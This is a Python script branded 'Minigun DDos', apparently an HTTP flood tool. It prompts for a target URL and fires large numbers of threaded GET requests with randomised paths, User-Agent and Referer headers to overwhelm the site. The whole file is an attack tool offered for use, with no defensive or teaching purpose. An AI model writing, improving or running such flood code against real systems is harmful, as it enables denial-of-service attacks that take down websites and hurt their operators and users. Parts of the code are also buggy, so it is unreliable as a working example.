import os
import urllib.request
import urllib.error

import sys
from UserAgent import headers_useragents
from referes import headers_referers
import threading
import random

os.system('python3 referes.py')
os.system('python3 useragent.py')

payload = ""
characters = "abcdefghijklmnopqrstuvwxyz1234567890"
number = 0

# generating random characters for payloads


def Params(lenght):
    global payload
    global characters 
    
    while len(payload) <= lenght:
        payload += random.choice(characters)
        return payload




# building a request
def BuildRequest():
    request = urllib.request.Request(f"{target}{Params(random.randint(3,9))}/{Params(random.randint(1,12))}")
    request.add_header("User-agent",random.choice(headers_useragents))
    request.add_header("Referer",random.choice(headers_referers))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    try:
        resp = urllib.request.urlopen(request)
        print(resp.code)
    except urllib.error.HTTPError as e:
        pass
    
    except 	urllib.error.URLError as e:
        pass
 
# multithreading the request
class HTTPTthread(threading.Thread):

    def run(self):
            global number

            try:
                number += 1
                BuildRequest()
                print("/ATTACKING/")
                print(f"/SENDING REQUEST WITH THREAD:{number}")
            except Exception as e:
                pass

    
  

# run the thread
def RunThread():

    for i in range(random.randint(11111,99999)):

        t = HTTPTthread()
        t.start()
        t.join()

    print("/THREAD FINISHED EXIT/")
    quit()


# main

if __name__ == "__main__":
    print("""   _________
            /'        /|
            /         / |_
        /         /  //|
        /_________/  ////|
        |   _ _    | 8o////|
        | /'// )_  |   8///|
        |/ // // ) |   8o///|
        / // // //,|  /  8//|
        / // // /// | /   8//|
    / // // ///__|/    8//|
    /.(_)// /// |       8///|
    (_)' `(_)//| |       8////|___________
    (_) /_\ (_)'| |        8///////////////
    (_) \"/ (_)'|_|         8/////////////
    (_)._.(_) d' Hb         8oooooooopb'
    `(_)'  d'  H`b
            d'   `b`b
            d'     H `b
        d'      `b `b
        d'           `b
        d'             `b
Minigun
DDos-Made by DRIMIIX

""")
    target = input("/ENTER YOUR FULL TARGET/: ")
    print("/TARGET VERFIED/")
    ans = input("/DO YOU WANT TO START ATTACKING?y[y or n]/")
    if ans.startswith("y"):
        print("/STARTING TO ATTACK/")
        t1 = threading.Thread(target=RunThread)
        t2 = threading.Thread(target=RunThread)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    else:
        print("/NO PERMISSION/")
        quit()

